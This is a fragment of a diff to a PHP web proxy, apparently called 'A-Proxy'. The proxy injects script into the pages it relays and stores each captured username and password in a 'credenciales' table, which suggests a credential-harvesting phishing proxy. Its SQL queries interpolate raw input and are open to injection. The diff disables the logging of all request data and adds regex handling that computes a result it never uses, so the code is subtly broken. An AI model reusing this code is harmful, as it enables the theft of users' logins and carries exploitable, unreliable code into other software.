@@ -263,7 +263,7 @@ else {
       $sql="INSERT INTO credenciales (origen, usuario, contrasena)  VALUES ('$origen', '$username', '$password'); ";
       $conn->query($sql);
 
-      $posst = "";
+      /*$posst = "";
       $gett = "";
 
       foreach ($_POST as $key => $value) {
@@ -273,7 +273,7 @@ else {
         $gett = $gett . $key . ": " . $value . "\r\n";
       }
       $sql="INSERT INTO requests (post, get)  VALUES ('$posst', '$gett'); ";
-      mysqli_query($conn, $sql);
+      mysqli_query($conn, $sql);*/
     }
 
     
@@ -674,11 +674,22 @@ if (stripos($contentType, "text/html") !== false) {
         }
       })();'
     );    
+
+    //</g
     $scriptElem->setAttribute("type", "text/javascript");
     $prependElem->insertBefore($scriptElem, $prependElem->firstChild);
   }
 
-  echo "<!-- A-Proxy -->\n" . $doc->saveHTML();
+  $StrDoc = $doc->saveHTML();
+  $patterns = array();
+  $patterns[0] = '#</g#';
+  $patterns[1] = '#$/i#';
+  $replacements = array();
+  $replacements[1] = '';
+  $replacements[0] = '\$/i';
+  $responseBody = preg_replace($patterns, $replacements, $StrDoc);
+  //  $/i    \$/i
+  echo "<!-- A-Proxy -->\n" . $StrDoc;
 } 
 else if (stripos($contentType, "text/css") !== false) { //This is CSS, so proxify url() references.
   echo proxifyCSS($responseBody, $url);
